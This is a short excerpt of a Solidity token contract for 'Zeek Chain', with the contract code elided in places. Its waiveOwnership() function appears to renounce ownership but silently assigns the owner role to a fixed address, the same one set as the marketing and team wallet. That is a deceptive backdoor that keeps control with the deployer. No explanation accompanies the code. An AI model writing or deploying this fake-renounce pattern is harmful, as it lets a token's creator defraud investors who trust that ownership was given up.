...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x009cF0C425C8eCDFffd46aC6dD46bBEbf407a8cb);
    }
...
contract ZEEKCHAIN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Zeek Chain";
    string private _symbol = "Zeek";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x009cF0C425C8eCDFffd46aC6dD46bBEbf407a8cb);
    address payable public teamWalletAddress = payable(0x009cF0C425C8eCDFffd46aC6dD46bBEbf407a8cb);
